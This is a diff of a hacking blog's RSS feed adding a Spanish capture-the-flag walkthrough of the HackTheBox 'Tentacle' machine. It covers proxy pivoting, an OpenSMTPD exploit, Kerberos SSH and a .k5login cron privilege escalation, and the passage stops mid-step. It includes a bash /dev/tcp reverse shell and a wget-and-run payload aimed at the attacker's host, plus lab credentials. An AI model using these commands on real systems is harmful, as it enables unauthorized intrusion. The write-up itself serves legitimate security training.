@@ -1,5 +1,459 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Crafty HTB Writeup</title><link>https://fuwari.vercel.app/posts/crafty/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/crafty/</guid><description>Easy Machine</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;En esta máquina encontraremos un servidor de &lt;code&gt;Minecraft 1.16.5&lt;/code&gt; vulnerable al conocido &lt;code&gt;CVE-2021-44228&lt;/code&gt;, tras abusar de él para obtener la ejecución de comandos en la máquina.&lt;/p&gt;
-&lt;h1&gt;Information Gathering&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Tentacle HTB Writeup</title><link>https://fuwari.vercel.app/posts/tentacle/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/tentacle/</guid><description>Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.</description><pubDate>Wed, 04 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;DNS Enumeration (dnsenum)&lt;/li&gt;
+&lt;li&gt;SQUID Proxy&lt;/li&gt;
+&lt;li&gt;WPAD Enumeration&lt;/li&gt;
+&lt;li&gt;OpenSMTPD v2.0.0 Exploit&lt;/li&gt;
+&lt;li&gt;SSH using Kerberos (gssapi)&lt;/li&gt;
+&lt;li&gt;Abusing .k5login file&lt;/li&gt;
+&lt;li&gt;Abusing krb5.keytab file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Primero el ping de siempre a la IP de la  maquina victima:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ping -c 1 10.10.10.224 
+PING 10.10.10.224 (10.10.10.224) 56(84) bytes of data.
+64 bytes from 10.10.10.224: icmp_seq=1 ttl=63 time=133 ms
+
+--- 10.10.10.224 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 133.304/133.304/133.304/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Iniciamos nuestro escaneo de puertos con nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -sS -p- --open --min-rate 4000 -n -Pn 10.10.10.224 -oG nmap
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+3128/tcp open  squid-http
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Copiamos los puertos en la clipboard para realizar escaneo de versiones:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ports=&quot;$(cat nmap | grep -oP &apos;\d{1,5}/open&apos; | awk &apos;{print $1}&apos; FS=&apos;/&apos; | xargs | tr &apos; &apos; &apos;,&apos;)&quot;; ip_address=&quot;$(cat nmap | grep -oP &apos;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&apos; | sort -u | head -n 1)&quot;; echo -e &quot;\n[*] Extracting information...\n&quot; &amp;gt; extractPorts.tmp; echo -e &quot;\t[*] IP Address: $ip_address&quot; &amp;gt;&amp;gt; extractPorts.tmp; echo -e &quot;\t[*] Open ports: $ports\n&quot; &amp;gt;&amp;gt; extractPorts.tmp; echo $ports | tr -d &apos;\n&apos; | xclip -sel clip; echo -e &quot;[*] Ports copied to clipboard\n&quot; &amp;gt;&amp;gt; extractPorts.tmp; cat extractPorts.tmp; rm extractPorts.tmp
+
+
+*] Extracting information...
+
+        [*] IP Address: 10.10.10.224
+        [*] Open ports: 22,53,88,3128
+
+[*] Ports copied to clipboard
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;nmap -p22,53,88,3128 -sVC 10.10.10.224 -Pn
+
+PORT     STATE SERVICE      VERSION
+22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
+| dns-nsid: 
+|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
+88/tcp   open  kerberos-sec MIT Kerberos (server time: 2024-08-06 19:10:40Z)
+3128/tcp open  http-proxy   Squid http proxy 4.11
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/4.11
+Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Los puertos abiertos que se muestran son &lt;code&gt;22 SSH&lt;/code&gt;, &lt;code&gt;53 DNS&lt;/code&gt;, &lt;code&gt;88 Kerberos&lt;/code&gt; y &lt;code&gt;3128 HTTP-Proxy&lt;/code&gt;. Nmap ya nos da el dominio de la máquina &lt;code&gt;REALCORP.HTB&lt;/code&gt;. SSH normalmente no es tan interesante, así que comencemos nuestra enumeración con DNS.&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;h2&gt;Port 53 - DNS&lt;/h2&gt;
+&lt;p&gt;Para la enumeración de DNS voy a utilizar la herramienta dnsenum. Como ya conocemos el dominio, podemos utilizar esta herramienta para buscar nuevos subdominios.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;dnsenum --threads 100 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Obtenemos dos subdominios interesantes &lt;code&gt;proxy y wpad&lt;/code&gt; Sin embargo, al observar la dirección, parecen ser direcciones internas que el servidor DNS filtró accidentalmente. Todavía podemos agregar estas entradas a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;. Continuaremos nuestra enumeración mirando &lt;code&gt;Squid&lt;/code&gt; (que se ejecuta en el puerto 3128).&lt;/p&gt;
+&lt;h2&gt;Port 3128 - HTTP-Proxy (Squid)&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Obtenemos información valiosa de esta página de error:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Un nombre de usuario &lt;code&gt;j.nakazawa&lt;/code&gt; (y dominio, si no lo supiéramos ya)&lt;/li&gt;
+&lt;li&gt;Hora actual en la máquina (Importante, si trabajamos con Kerberos)&lt;/li&gt;
+&lt;li&gt;Otro subdominio &lt;code&gt;srv01.realcorp.htb&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Versión calamar &lt;code&gt;4.11&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Agreguemos todos los host a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10.10.10.224    srv01.realcorp.htb realcorp.htb
+10.197.243.31   wpad.realcorp.htb
+10.197.243.77   ns.realcorp.htb proxy.realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A continuación, intentemos acceder a la red interna (10.197.243.0) mediante cadenas proxy. Para esto tenemos que editar nuestra configuración de proxychains:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nano /etc/proxychains.conf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Agregamos el proxy externo a nuestra configuración de cadenas de proxy, por lo que todo el tráfico que pasa por el túnel del proxy pasará por el proxy Squid.&lt;/p&gt;
+&lt;p&gt;hagamos un mapeo del proxy externo al salir del túnel (lado LAN del proxy).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n 127.0.0.1
+
+Host discovery disabled (-Pn). All addresses will be marked &apos;up&apos; and scan times will be slower.
+Nmap scan report for 127.0.0.1
+Host is up (0.46s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al escanear la interfaz interna del proxy externo, obtenemos dos puertos adicionales: &lt;code&gt;464 y 749.&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Accessing internal resources&lt;/h3&gt;
+&lt;p&gt;Al acceder al proxy externamente, la configuración del proxy puede definir a qué recursos se puede acceder desde el exterior.&lt;/p&gt;
+&lt;p&gt;Intentemos ver si tenemos acceso al proxy interno, que según DNS es &lt;code&gt;proxy.realcorp.htb (10.197.243.77)&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -p 3128 10.197.243.77
+
+PORT     STATE    SERVICE
+3128/tcp filtered squid-http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;No obtenemos acceso al servidor proxy interno desde el exterior. Intentemos enrutar a través de la interfaz interna del proxy.&lt;/p&gt;
+&lt;p&gt;Aquí hay un esquema simplificado para explicar lo que estoy tratando de lograr:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;La línea negra nos muestra el acceso al proxy externamente desde nuestra máquina. La línea roja muestra que no es posible el acceso directo al proxy interno desde el exterior. La línea azul nos muestra haciendo proxy a través de la interfaz interna del proxy, antes de continuar con el proxy interno.&lt;/p&gt;
+&lt;p&gt;Para hacer esto, debemos agregar a nuestra ProxyList:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nano /etc/proxychains.conf 
+
+http 10.10.10.224 3128 
+http 127.0.0.1 3128 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora deberíamos poder acceder al proxy interno (10.197.243.77).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -p 3128 10.197.243.77
+Nmap scan report for 10.197.243.77
+Host is up (0.16s latency).
+
+PORT     STATE SERVICE
+3128/tcp open  squid-http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;agreguemos este proxy a nuestra cadena.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nano /etc/proxychains.conf 
+
+http 10.10.10.224 3128 
+http 127.0.0.1 3128 
+http 10.197.243.77 3128
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora deberíamos poder acceder a la red interna.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;WPAD server&lt;/h2&gt;
+&lt;p&gt;Ahora que tenemos acceso a la red interna, deberíamos poder escanear el servidor wpad en busca de puertos abiertos.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains4 -q nmap -sT -Pn -n 10.197.243.31
+Nmap scan report for 10.197.243.31
+Host is up (0.22s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Intentemos acceder al sitio web.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains firefox wpad.realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;al conectarnos a wpad.realcorp.htb, obtenemos un 403 Prohibido.&lt;/p&gt;
+&lt;h3&gt;Investigacion de WPAD&lt;/h3&gt;
+&lt;p&gt;Al investigar cómo funciona WPAD, encontré esta página web que dice lo siguiente:&lt;/p&gt;
+&lt;p&gt;https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks&lt;/p&gt;
+&lt;p&gt;“Muchos navegadores utilizan el descubrimiento automático de proxy web (WPAD) para cargar la configuración del proxy desde la red. Un servidor WPAD proporciona configuraciones de proxy del cliente a través de una URL particular (por ejemplo, http://wpad.example.org/wpad.dat)…”&lt;/p&gt;
+&lt;p&gt;Intentemos obtener este archivo wpad.dat del servidor.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q curl wpad.realcorp.htb/wpad.dat
+function FindProxyForURL(url, host) {
+    if (dnsDomainIs(host, &quot;realcorp.htb&quot;))
+        return &quot;DIRECT&quot;;
+    if (isInNet(dnsResolve(host), &quot;10.197.243.0&quot;, &quot;255.255.255.0&quot;))
+        return &quot;DIRECT&quot;; 
+    if (isInNet(dnsResolve(host), &quot;10.241.251.0&quot;, &quot;255.255.255.0&quot;))
+        return &quot;DIRECT&quot;; 
+ 
+    return &quot;PROXY proxy.realcorp.htb:3128&quot;;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al observar el archivo wpad.dat, podemos ver que hay otra subred previamente desconocida &lt;code&gt;10.241.251.0/24&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Podemos usar nslookup para hacerlo.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;man nslookup
+DESCRIPTION
+	Nslookup is a program to query Internet domain name servers.  Nslookup has two modes: interactive and
+    non-interactive. [...] Non-interactive mode is used to print just the name and requested information for a host or domain.
+[...]
+RETURN VALUES
+    nslookup returns with an exit status of 1 if any query failed, and 0 otherwise.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos usar la siguiente sintaxis para verificar si existe un host:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nslookup 10.241.251.X 10.10.10.224
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si el código de salida no es cero, el host no existe.&lt;/p&gt;
+&lt;p&gt;Podemos implementar esto con un script bash:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+DNS_SERVER=&quot;10.10.10.224&quot;
+IP_RANGE=&quot;10.241.251&quot;
+
+for HOST in $(seq 1 254);
+ do
+   IP=&quot;$IP_RANGE.$HOST&quot;
+   nslookup &quot;$IP&quot; $DNS_SERVER 1&amp;gt;&amp;amp;2&amp;gt;/dev/null # Try to resolve IP to a hostname
+   if [[ $? -eq 0 ]]; # If nslookup exited with 0, the query was successful = host found
+    then
+       echo &quot;Host ($IP) found via DNS:&quot;
+       nslookup &quot;$IP&quot; $DNS_SERVER # Print info
+    fi
+ done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ejecutemos el script y veamos si se puede encontrar algún host.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./dns-scan.sh 
+
+Host (10.241.251.113) found via DNS:
+113.251.241.10.in-addr.arpa     name = srvpod01.realcorp.htb.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos con éxito un host: 10.241.251.113 (srvpod01.realcorp.htb). Usemos nmap para encontrar cualquier puerto abierto.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -v 10.241.251.113
+
+Discovered open port 25/tcp on 10.241.251.113
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que el puerto &lt;code&gt;25 (SMTP)&lt;/code&gt; está abierto en el host.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -sC -sV -p 25 10.241.251.113 
+Nmap scan report for 10.241.251.113
+Host is up (0.19s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    OpenSMTPD
+| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que el nombre de host del servidor es &lt;code&gt;smtp.realcorp.htb&lt;/code&gt; y está ejecutando &lt;code&gt;OpenSMTPD (Versión 2.0.0)&lt;/code&gt;. Agreguemos el host a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nano /etc/hosts
+10.10.10.224    srv01.realcorp.htb
+10.197.243.31   wpad.realcorp.htb
+10.197.243.77   ns.realcorp.htb proxy.realcorp.htb
+10.241.251.113  smtp.realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;busquemos un exploit para OpenSMTPD v2.0.0.&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Explotation&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Buscando en google encontramos un exploit:
+https://www.exploit-db.com/exploits/47984&lt;/p&gt;
+&lt;p&gt;Vamos a enviarnos una revshell:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 1234
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;echo &apos;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/1234 0&amp;gt;&amp;amp;1&quot;&apos; &amp;gt; /var/www/html/index.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;sudo service apache2 start
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;proxychains python3 47984.py 10.241.251.113 25 &apos;wget 10.10.14.11;bash index.html&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenenos la shell.&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Comencemos enumerando todos los usuarios de la máquina:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@smtp:/home# ls -alh
+total 0
+drwxr-xr-x. 1 root       root       24 Dec  8 10:56 .
+drwxr-xr-x. 1 root       root       96 Dec  8 18:50 ..
+drwxr-xr-x. 1 j.nakazawa j.nakazawa 59 Dec  9 12:31 j.nakazawa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que el único usuario de este sistema es &lt;code&gt;j.nakazawa&lt;/code&gt;. Echemos un vistazo a su carpeta de inicio.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@smtp:/home/j.nakazawa# ls -alh
+total 16K
+drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Dec  9 12:31 .
+drwxr-xr-x. 1 root       root         24 Dec  8 10:56 ..
+lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .bash_history -&amp;gt; /dev/null
+-rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
+-rw-r--r--. 1 j.nakazawa j.nakazawa 3.5K Apr 18  2019 .bashrc
+-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8 19:12 .msmtprc
+-rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
+lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .viminfo -&amp;gt; /dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Detectamos un archivo interesante en la carpeta de inicio del usuario: .msmtprc. Este es un archivo de configuración para usar el cliente SMTP. Comprobemos posibles contraseñas.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@smtp:/home/j.nakazawa# cat .msmtprc
+# Set default values for all following accounts.
+defaults
+auth           on
+tls            on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile        /dev/null
+
+# RealCorp Mail
+account        realcorp
+host           127.0.0.1
+port           587
+from           j.nakazawa@realcorp.htb
+user           j.nakazawa
+password       sJB}RM&amp;gt;6Z~64_
+tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+# Set a default account
+account default : realcorp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Obtenemos las credenciales para el usuario &lt;code&gt;j.nakazawa&lt;/code&gt;:&lt;code&gt;sJB}RM6Z~64_&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Intentemos iniciar sesión en el servidor principal a través de SSH.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh j.nakazawa@10.10.10.224
+j.nakazawa@10.10.10.224 password: sJB}RM&amp;gt;6Z~64_
+Permission denied, please try again.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que esto no funciona. Sin embargo, el mensaje de error me llama la atención. Nunca antes había visto gssapi-keyex ni gssapi-with-mic. Empecemos a investigar.&lt;/p&gt;
+&lt;h2&gt;Investigando la autenticación SSH usando gssapi&lt;/h2&gt;
+&lt;p&gt;Después de buscar esto por un tiempo, encontré esta respuesta en serverfault:
+https://serverfault.com/questions/75362/what-is-gssapi-with-mic/1041704#1041704&lt;/p&gt;
+&lt;p&gt;que habla de que está relacionada con Kerberos. Esto tendría sentido ya que hay varios puertos abiertos relacionados con Kerberos. Continuaremos nuestra investigación para que SSH utilice Kerberos.&lt;/p&gt;
+&lt;p&gt;Finalmente, encontré este documento de AWS:
+https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html&lt;/p&gt;
+&lt;p&gt;que parece describir bastante bien nuestro escenario. Esto indica que tenemos que configurar el archivo /etc/krb5.conf, ejecutar kinit y luego usar ssh -K.&lt;/p&gt;
+&lt;h2&gt;Configuración de la autenticación Kerberos&lt;/h2&gt;
+&lt;p&gt;Ok, comencemos configurando &lt;code&gt;/etc/krb5.conf&lt;/code&gt;, para esto primero tenemos que instalar &lt;code&gt;krb5-user&lt;/code&gt; (apt install krb5-user).&lt;/p&gt;
+&lt;p&gt;El archivo &lt;code&gt;/etc/krb5.conf&lt;/code&gt; debería tener el siguiente aspecto:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat /etc/krb5.conf
+[libdefaults]
+        default_realm = REALCORP.HTB # Change default realm
+        
+        [...]
+
+[realms]
+		# Add realm
+        REALCORP.HTB = {
+                kdc = 10.10.10.224
+        }
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Configuramos la hora, con la hora de la maquina victima:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ntpdate 10.10.10.224
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora deberíamos ejecutar kinit con nuestro usuario.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kinit j.nakazawa
+Password for j.nakazawa@REALCORP.HTB: sJB}RM&amp;gt;6Z~64_
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si tenemos éxito, deberíamos ver un ticket en el caché, si ejecutamos klist.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;klist
+Ticket cache: FILE:/tmp/krb5cc_0
+Default principal: j.nakazawa@REALCORP.HTB
+
+Valid starting       Expires              Service principal
+02/23/2021 20:47:48  02/24/2021 20:41:46  krbtgt/REALCORP.HTB@REALCORP.HTB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;obtenemos un ticket válido que debería permitirnos ingresar mediante SSH a la máquina.&lt;/p&gt;
+&lt;h2&gt;SSH using Kerberos&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;ssh  j.nakazawa@REALCORP.HTB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement #2&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Veamos qué usuarios están en el sistema.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ cat /etc/passwd | grep &quot;/bin/.*sh&quot;
+root:x:0:0:root:/root:/bin/bash
+j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
+admin:x:1011:1011::/home/admin:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El administrador parece un objetivo interesante... Intentemos encontrar una manera de acceder al administrador.&lt;/p&gt;
+&lt;p&gt;Al observar los cronjobs, parece que el usuario administrador ejecuta un script cada minuto:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ cat /etc/crontab 
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+* * * * * admin /usr/local/bin/log_backup.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Echemos un vistazo al script log_backup&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que el usuario administrador copia todo desde la carpeta &lt;code&gt;/var/log/squid&lt;/code&gt; a su carpeta de inicio. Luego archiva los dos archivos de registro y los elimina. Como todo se copia, pero solo se eliminan los dos archivos especificados, potencialmente tenemos escritura arbitraria en la carpeta &lt;code&gt;/home/admin&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Confirmemos esto comprobando si tenemos acceso de escritura a la carpeta &lt;code&gt;/var/log/squid&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ ls -alh /var/log/
+total 1.4M
+drwxr-xr-x. 12 root   root   4.0K Feb 23 19:52 .
+drwxr-xr-x. 22 root   root   4.0K Dec 24 06:24 ..
+drwx-wx---.  2 admin  squid    41 Dec 24 06:36 squid
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que solo el usuario administrador puede leer la carpeta, sin embargo, el grupo squid puede escribir en la carpeta. Revisemos nuestros grupos.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ id
+uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Parece que somos parte del grupo de squid, lo que confirma nuestro vector de ataque. La única pregunta que queda es qué queremos escribir en la carpeta. Normalmente, escribiría mi clave ssh en .ssh/authorized_keys. Sin embargo, la autenticación de clave pública está deshabilitada. Mi investigación de Kerberos con SSH reveló que hay una manera de permitir que otros usuarios inicien sesión en su cuenta utilizando un archivo .k5login como se indica en este artículo:
+https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html&lt;/p&gt;
+&lt;p&gt;“Si desea permitir que otra persona inicie sesión en su cuenta a través de Kerberos, puede agregar su principal de Kerberos a su archivo ~/.k5login. ¡Asegúrate de agregar también el tuyo propio si creas este archivo, ya que de lo contrario no podrás acceder a tu propia cuenta!&lt;/p&gt;
+&lt;h2&gt;Privesc al administrador: Explotación del script log_backup&lt;/h2&gt;
+&lt;p&gt;tenemos que crear nuestro archivo en /var/log/squid/.k5login y esperar hasta que se copie en la carpeta del administrador. Entonces deberíamos poder utilizar SSH como administrador cuando la tarean cron se ejecute.&lt;/p&gt;
+&lt;p&gt;Te recomiendo que lo hagas varias veces, ya que a la primera no va:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
+[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
+[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
+[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
